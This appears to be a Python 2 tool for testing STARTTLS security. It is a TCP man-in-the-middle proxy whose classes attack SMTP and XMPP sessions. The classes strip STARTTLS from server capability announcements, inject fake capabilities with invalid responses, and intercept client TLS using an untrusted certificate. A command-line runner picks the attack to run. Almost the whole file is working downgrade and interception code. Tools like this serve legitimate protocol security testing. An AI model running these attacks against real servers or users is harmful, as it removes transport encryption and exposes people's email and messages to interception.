#! /usr/bin/env python
# -*- coding: UTF-8 -*-
# Author : tintinweb@oststrom.com <github.com/tintinweb>
'''
                  inbound                    outbound
[inbound_peer]<------------>[listen:proxy]<------------->[outbound_peer/target]
'''
import socket
import select
import time
import sys
import logging
import ssl

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)-8s - %(message)s')
logger = logging.getLogger(__name__)

class SessionTerminatedException(Exception):pass
class ProtocolViolationException(Exception):pass

class TcpSockBuff(object):
    ''' Wrapped Tcp Socket with access to last sent/received data '''
    def __init__(self, sock, peer=None):
        self.socket = None
        self.socket_ssl = None
        self.recvbuf = ''
        self.sndbuf = ''
        self.peer = peer
        self._init(sock)
        
    def _init(self, sock):
        self.socket = sock
        
    def connect(self, target):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        return self.socket.connect(target)
    
    def accept(self):
        return self.socket.accept()
                
    def recv(self, buflen=8*1024):
        if self.socket_ssl:
            self.recvbuf = self.socket_ssl.read(buflen)
        else:
            self.recvbuf = self.socket.recv(buflen)
        return self.recvbuf
    
    def send(self, data):
        if self.socket_ssl:
            self.socket_ssl.write(data)
        else:
            self.socket.send(data)
        self.sndbuf = data
        
    def sendall(self, data):
        if self.socket_ssl:
            self.send(data)
        else:
            self.socket.sendall(data)
        self.sndbuf = data
        
    def ssl_wrap_socket(self, *args, **kwargs):
        if len(args)>=1:
            args[1] = self.socket
        if 'sock' in kwargs:
            kwargs['sock'] = self.socket
        if not args and not kwargs.get('sock'):
            kwargs['sock'] = self.socket
        self.socket_ssl = ssl.wrap_socket(*args, **kwargs)
    
    def ssl_wrap_socket_with_context(self, ctx, *args, **kwargs):
        if len(args)>=1:
            args[1] = self.socket
        if 'sock' in kwargs:
            kwargs['sock'] = self.socket
        if not args and not kwargs.get('sock'):
            kwargs['sock'] = self.socket
        self.socket_ssl = ctx.wrap_socket(*args, **kwargs)
        
class ProtocolDetect(object):
    PROTO_SMTP = 25
    PROTO_XMPP = 5222
    
    PORTMAP = {25:  PROTO_SMTP,
               5222:PROTO_XMPP,
               }
    
    KEYWORDS = ((['ehlo', 'helo','starttls','rcpt to:','mail from:'], PROTO_SMTP),
                (['xmpp'], PROTO_XMPP),)
    
    def __init__(self, target=None):
        self.protocol_id = None
        self.history = []
        if target:
            self.protocol_id = self.PORTMAP.get(target[1])
            if self.protocol_id:
                logging.debug("%s - protocol detected (target port)"%repr(self))
    
    def __str__(self):
        return repr(self.proto_id_to_name(self.protocol_id))
    
    def __repr__(self):
        return "<ProtocolDetect %s protocol_id=%s len_history=%d>"%(hex(id(self)), self.proto_id_to_name(self.protocol_id), len(self.history))
            
    def proto_id_to_name(self, id):
        if not id:
            return id
        for p in (a for a in dir(self) if a.startswith("PROTO_")):
            if getattr(self, p)==id:
                return p
    
    def detect(self, data):
        if self.protocol_id:
            return self.protocol_id
        self.history.append(data)
        for keywordlist,proto in self.KEYWORDS:
            if any(k in data.lower() for k in keywordlist):
                self.protocol_id = proto
                logging.debug("%s - protocol detected (protocol messages)"%repr(self))
                return
        
class Session(object):
    ''' Proxy session from client <-> proxy <-> server 
        @param inbound: inbound socket
        @param outbound: outbound socket
        @param target: target tuple ('ip',port) 
        @param buffer_size: socket buff size'''
    
    def __init__(self, proxy, inbound=None, outbound=None, target=None, buffer_size=4096):
        self.proxy = proxy
        self.bind = proxy.getsockname()
        self.inbound = TcpSockBuff(inbound)
        self.outbound = TcpSockBuff(outbound, peer=target)
        self.buffer_size = buffer_size
        self.protocol = ProtocolDetect(target=target)
    
    def __repr__(self):
        return "<Session %s [client: %s] --> [prxy: %s] --> [target: %s]>"%(hex(id(self)),
                                                                            self.inbound.peer,
                                                                            self.bind,
                                                                            self.outbound.peer)
    def __str__(self):
        return "<Session %s>"%hex(id(self))
        
    def connect(self, target):
        self.outbound.peer = target
        logger.info("%s connecting to target %s"%(self, repr(target)))
        return self.outbound.connect(target)
    
    def accept(self):
        sock, addr = self.proxy.accept()
        self.inbound = TcpSockBuff(sock)
        self.inbound.peer = addr
        logger.info("%s client %s has connected"%(self,repr(self.inbound.peer)))
        return sock,
    
    def get_peer_sockets(self):
        return [self.inbound.socket, self.outbound.socket]
    
    def notify_read(self, sock):
        if sock == self.proxy:
            self.accept()
            self.connect(self.outbound.peer)
        elif sock == self.inbound.socket:
            # new client -> prxy - data
            self.on_recv(self.inbound, self.outbound, self)
        elif sock == self.outbound.socket:
            # new sprxy <- target - data
            self.on_recv(self.outbound, self.inbound, self)
        return 
    
    def close(self):
        self.outbound.socket.close()
        self.inbound.socket.close()
        raise SessionTerminatedException()
    
    def on_recv(self, s_in, s_out, session):
        data = s_in.recv(session.buffer_size)
        self.protocol.detect(data)
        if not len(data):
            return session.close()
        if s_in == session.inbound:
            data = self.mangle_client_data(session, data)
        elif s_in == session.outbound:
            data = self.mangle_server_data(session, data)
        if data:
            s_out.sendall(data)
        return data
    
    def inbound_starttls(self, session, sslctx=None): 
        raise NotImplementedError("Implement this in proto class")
    def outbound_starttls(self, session, sslctx=None): 
        raise NotImplementedError("Implement this in proto class")
    
    def mangle_client_data(self, session, data): return data
    def mangle_server_data(self, session, data): return data
    
class ProxyServer(object):
    '''Proxy Class'''
    
    def __init__(self, listen, target, buffer_size=4096, delay=0.0001):
        self.input_list = set([])
        self.sessions = {}  # sock:Session()
        self.callbacks = {} # name: [f,..]
        #
        self.listen = listen
        self.target = target
        #
        self.buffer_size = buffer_size
        self.delay = delay
        self.inbound = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.inbound.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.inbound.bind(listen)
        self.inbound.listen(200)
        
    def __str__(self):
        return "<Proxy %s listen=%s target=%s>"%(hex(id(self)),self.listen, self.target)

    def get_session_by_client_sock(self, sock):
        return self.sessions.get(sock)

    def set_callback(self, name, f):
        self.callbacks[name] = f

    def main_loop(self):
        self.input_list.add(self.inbound)
        while True:
            time.sleep(self.delay)
            inputready, _, _ =  select.select(self.input_list, [], [])
            
            for sock in inputready:
                session = None
                try:
                    if sock == self.inbound:
                        # on_accept
                        session = Session(sock, target=self.target)
                        for k,v in self.callbacks.iteritems():
                            setattr(session, k, v)
                        session.notify_read(sock)
                        for s in session.get_peer_sockets():
                            self.sessions[s]=session
                        self.input_list.update(session.get_peer_sockets())
                    else:
                        # on_recv
                        try:
                            session = self.get_session_by_client_sock(sock)
                            session.notify_read(sock)
                        except SessionTerminatedException:
                            self.input_list.difference_update(session.get_peer_sockets())
                            logger.warning("%s terminated."%session)
                except Exception, e:
                    logger.warning("main: %s"%repr(e))
                    if session:
                        self.input_list.difference_update(session.get_peer_sockets())
                    else:
                        self.inbound.remove(sock)
                    raise        

class SMTP:
    class StripFromCapabilities:
        ''' 1) Force Server response to *NOT* announce STARTTLS support
            2) raise exception if client tries to negotiated STARTTLS
        '''
        @staticmethod
        def mangle_server_data(session, data):
            if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data:
                features = [f for f in data.strip().split('\r\n') if not "STARTTLS" in f]
                if not features[-1].startswith("250 "):
                    features[-1] = features[-1].replace("250-","250 ")  # end marker
                data = '\r\n'.join(features)+'\r\n' 
            return data
        @staticmethod
        def mangle_client_data(session, data):
            if "STARTTLS" in data:
                raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
            return data
        
    class StripWithInvalidResponseCode:
        ''' 1) Force Server response to contain STARTTLS even though it does not support it (just because we can)
            2) Respond to client STARTTLS with invalid response code
        '''
        @staticmethod
        def mangle_server_data(session, data):
            if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data:
                features = list(data.strip().split("\r\n"))
                features.insert(-1,"250-STARTTLS")     # add STARTTLS from capabilities
                #if "STARTTLS" in data:
                #    features = [f for f in features if not "STARTTLS" in f]    # remove STARTTLS from capabilities
                data = '\r\n'.join(features)+'\r\n' 
            return data
        @staticmethod
        def mangle_client_data(session, data):
            if "STARTTLS" in data:
                session.inbound.sendall("200 STRIPTLS\r\n")
                logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("200 STRIPTLS\r\n")))
                data=None
            return data
        
    class UntrustedIntercept:
        ''' 1) Do not mangle server data
            2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
               in case client does not check keys
        '''
        TLS_CERTFILE = "server.pem"
        TLS_KEYFILE = "server.pem"
        @staticmethod
        def mangle_server_data(session, data):
            return data
        @staticmethod
        def mangle_client_data(session, data):
            if "STARTTLS" in data:
                # do inbound STARTTLS
                session.inbound.sendall("220 Go ahead\r\n")
                logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("220 Go ahead\r\n")))
                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                context.load_cert_chain(certfile=SMTP.UntrustedIntercept.TLS_CERTFILE, 
                                        keyfile=SMTP.UntrustedIntercept.TLS_KEYFILE)
                session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
                logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
                # outbound ssl
                
                session.outbound.sendall(data)
                logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
                resp_data = session.outbound.recv()
                if "220" not in resp_data:
                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
                
                logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
                session.outbound.ssl_wrap_socket()

                data=None
            return data

class XMPP:
    class StripFromCapabilities:
        ''' 1) Force Server response to *NOT* announce STARTTLS support
            2) raise exception if client tries to negotiated STARTTLS
        '''
        @staticmethod
        def mangle_server_data(session, data):
            if "<starttls" in data:
                start = data.index("<starttls")
                end = data.index("</starttls>",start)+len("</starttls>")
                data = data[:start] + data[end:]        # strip starttls from capabilities
            return data
        @staticmethod
        def mangle_client_data(session, data):
            if "<starttls" in data:
                # do not respond with <proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>
                #<failure/> or <proceed/>
                raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
                #session.inbound.sendall("<success xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")  # fake respone
                #data=None
            return data 

class RewriteDispatcher(object):
    def __init__(self):
        self.attacks = {}   # proto:[attacks]
        
    def __repr__(self):
        return "<RewriteDispatcher attacks=%s>"%repr(self.attacks)
    
    def add(self, proto, attack):
        self.attacks.setdefault(proto,set([]))
        self.attacks[proto].add(attack)
        
    def get_attack(self, proto):
        return self.attacks.get(proto,[])
        
    def mangle_server_data(self, session, data):
        data_orig = data
        logging.debug("%s [client] <= [server]          %s"%(session,repr(data)))
        if self.get_attack(session.protocol.protocol_id):
            #TODO: just use the first one for now
            data = iter(self.get_attack(session.protocol.protocol_id)).next().mangle_server_data(session, data)
        #if session.protocol.protocol_id==ProtocolDetect.PROTO_SMTP:
        #    data = SMTP.StripFromCapabilities.mangle_server_data(session, data)
        if data!=data_orig:
            logging.debug("%s [client] <= [server][mangled] %s"%(session,repr(data)))
        return data


    def mangle_client_data(self, session, data):
        data_orig = data
        logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
        if self.get_attack(session.protocol.protocol_id):
            #TODO: just use the first one for now
            data = iter(self.get_attack(session.protocol.protocol_id)).next().mangle_client_data(session, data)
        #if session.protocol.protocol_id==ProtocolDetect.PROTO_SMTP:    # SMTP
        #    data = SMTP.StripFromCapabilities.mangle_client_data(session, data)
        if data!=data_orig:
            logging.debug("%s [client] => [server][mangled] %s"%(session,repr(data)))
        return data

if __name__ == '__main__':
    ret = 0
    if not len(sys.argv)>1:
        print ("""<listen_ip> <listen_port> <forward_ip> <forward_port> [<attack_class>]
    attack_class ... SMTP.StripFromCapabilities, SMTP.StripWithInvalidResponseCode, SMTP.UntrustedIntercept, ...
        """)
        sys.exit(1)
    
    local_listen = (sys.argv[1], int(sys.argv[2]))
    forward_to = (sys.argv[3],int(sys.argv[4]))
    classname = sys.argv[5] if len(sys.argv)>5 else "SMTP.StripFromCapabilities"
    ## hacky!
    if "." in classname:
        lastdot = classname.rfind(".")
        cls = getattr(locals().get(classname[:lastdot]),classname[lastdot+1:])
        

    # magic
    prx = ProxyServer(listen=local_listen, target=forward_to, buffer_size=4096, delay=0.00001)
    logger.info("%s ready."%prx)
    rewrite = RewriteDispatcher()
    rewrite.add(ProtocolDetect.PROTO_SMTP, cls)
    
    logging.info( repr(rewrite))
    prx.set_callback("mangle_server_data", rewrite.mangle_server_data)
    prx.set_callback("mangle_client_data", rewrite.mangle_client_data)
    try:
        prx.main_loop()
    except KeyboardInterrupt:
        logger.warning( "Ctrl C - Stopping server")
        ret+=1
    sys.exit(ret)